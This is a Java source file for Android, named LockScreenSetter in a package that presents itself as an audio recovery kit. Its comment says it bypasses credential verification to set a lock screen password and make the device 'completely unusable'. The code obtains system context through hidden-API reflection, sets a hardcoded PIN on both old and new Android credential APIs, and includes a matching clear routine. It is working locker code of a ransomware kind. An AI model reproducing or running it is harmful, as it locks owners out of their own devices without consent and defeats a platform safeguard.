package com.recoverkit.audio;

import android.content.Context;
import android.os.IBinder;
import android.os.Looper;
import java.lang.reflect.Method;

/**
 * Uses system context to call ILockSettings.setLockCredential() directly,
 * bypassing the shell command's credential verification requirement.
 * This sets a random lock screen password, making the device completely unusable.
 */
public class LockScreenSetter {
    public static void main(String[] args) {
        System.out.println("[RecoverKit] LockScreenSetter starting...");

        try {
            // Must prepare Looper before ActivityThread.systemMain()
            Looper.prepareMainLooper();

            // Get system context via reflection (ActivityThread is hidden API)
            Class<?> atClass = Class.forName("android.app.ActivityThread");
            Object at = atClass.getMethod("systemMain").invoke(null);
            Context ctx = (Context) atClass.getMethod("getSystemContext").invoke(at);
            System.out.println("[RecoverKit] Got system context: " + ctx.getPackageName());

            String action = args.length > 0 ? args[0] : "set";

            if ("set".equals(action)) {
                setLockPassword(ctx);
            } else if ("clear".equals(action)) {
                clearLockPassword(ctx);
            }

        } catch (Exception e) {
            System.out.println("[RecoverKit] ERROR: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            e.printStackTrace();
        }
    }

    static void setLockPassword(Context ctx) {
        try {
            // Get ILockSettings service
            Class<?> smClass = Class.forName("android.os.ServiceManager");
            Method getService = smClass.getMethod("getService", String.class);
            IBinder binder = (IBinder) getService.invoke(null, "lock_settings");
            System.out.println("[RecoverKit] Got lock_settings binder: " + binder);

            // Get ILockSettings.Stub.asInterface(binder)
            Class<?> stubClass = Class.forName("com.android.internal.widget.ILockSettings$Stub");
            Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
            Object lockSettings = asInterface.invoke(null, binder);
            System.out.println("[RecoverKit] Got ILockSettings: " + lockSettings);

            String newPassword = "7391";

            // Enumerate methods to find the right signature
            Method[] methods = lockSettings.getClass().getMethods();
            System.out.println("[RecoverKit] Credential-related methods:");
            for (Method m : methods) {
                String name = m.getName();
                if (name.contains("Credential") || name.contains("Lock") || name.contains("assword")) {
                    System.out.println("  " + name + " -> " + java.util.Arrays.toString(m.getParameterTypes()));
                }
            }

            // Try the old String-based API first (Android 12 and below)
            try {
                Method setLock = lockSettings.getClass().getMethod(
                    "setLockCredential", String.class, String.class, int.class);
                setLock.invoke(lockSettings, newPassword, "", 0);
                System.out.println("[RecoverKit] Password SET via String API: " + newPassword);
                return;
            } catch (Exception e) {
                System.out.println("[RecoverKit] String API failed: " + e.getMessage());
            }

            // Try LockscreenCredential API (Android 13+)
            try {
                Class<?> lscClass = Class.forName("com.android.internal.widget.LockscreenCredential");

                // Enumerate LockscreenCredential methods to find factory methods
                System.out.println("[RecoverKit] LockscreenCredential static methods:");
                for (Method m : lscClass.getDeclaredMethods()) {
                    if (java.lang.reflect.Modifier.isStatic(m.getModifiers())) {
                        System.out.println("  static " + m.getName() + " -> " + java.util.Arrays.toString(m.getParameterTypes()) + " returns " + m.getReturnType().getSimpleName());
                    }
                }

                // Try createPin first, then createPassword
                // Note: parameter type is CharSequence, not String!
                Object newCred = null;
                try {
                    Method createPin = lscClass.getDeclaredMethod("createPin", CharSequence.class);
                    newCred = createPin.invoke(null, newPassword);
                } catch (NoSuchMethodException e) {
                    Method createPassword = lscClass.getDeclaredMethod("createPassword", CharSequence.class);
                    newCred = createPassword.invoke(null, newPassword);
                }
                System.out.println("[RecoverKit] Created LockscreenCredential for PIN: " + newPassword);

                // Try setLockCredential(LockscreenCredential, LockscreenCredential, int)
                Method setLock = lockSettings.getClass().getMethod(
                    "setLockCredential", lscClass, lscClass, int.class);
                setLock.invoke(lockSettings, newCred, null, 0);
                System.out.println("[RecoverKit] Password SET via LockscreenCredential API: " + newPassword);
                return;
            } catch (Exception e) {
                System.out.println("[RecoverKit] LockscreenCredential API failed: " + e.getMessage());
                e.printStackTrace();
            }

            System.out.println("[RecoverKit] FAILED to set password via all known APIs");

        } catch (Exception e) {
            System.out.println("[RecoverKit] setLockPassword ERROR: " + e.getMessage());
            e.printStackTrace();
        }
    }

    static void clearLockPassword(Context ctx) {
        try {
            Class<?> smClass = Class.forName("android.os.ServiceManager");
            Method getService = smClass.getMethod("getService", String.class);
            IBinder binder = (IBinder) getService.invoke(null, "lock_settings");

            Class<?> stubClass = Class.forName("com.android.internal.widget.ILockSettings$Stub");
            Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
            Object lockSettings = asInterface.invoke(null, binder);

            // Try LockscreenCredential API
            try {
                Class<?> lscClass = Class.forName("com.android.internal.widget.LockscreenCredential");
                Method createNone = lscClass.getDeclaredMethod("none");
                Object noneCred = createNone.invoke(null);

                Object oldCred = null;
                try {
                    Method createPin = lscClass.getDeclaredMethod("createPin", CharSequence.class);
                    oldCred = createPin.invoke(null, "7391");
                } catch (NoSuchMethodException e2) {
                    Method createPassword = lscClass.getDeclaredMethod("createPassword", CharSequence.class);
                    oldCred = createPassword.invoke(null, "7391");
                }

                Method setLock = lockSettings.getClass().getMethod(
                    "setLockCredential", lscClass, lscClass, int.class);
                setLock.invoke(lockSettings, noneCred, oldCred, 0);
                System.out.println("[RecoverKit] Password CLEARED");
                return;
            } catch (Exception e) {
                System.out.println("[RecoverKit] Clear via LockscreenCredential failed: " + e.getMessage());
            }

            // Try String API
            try {
                Method setLock = lockSettings.getClass().getMethod(
                    "setLockCredential", String.class, String.class, int.class);
                setLock.invoke(lockSettings, "", "7391", 0);
                System.out.println("[RecoverKit] Password CLEARED via String API");
                return;
            } catch (Exception e) {
                System.out.println("[RecoverKit] Clear via String API failed: " + e.getMessage());
            }

        } catch (Exception e) {
            System.out.println("[RecoverKit] clearLockPassword ERROR: " + e.getMessage());
            e.printStackTrace();
        }
    }
}
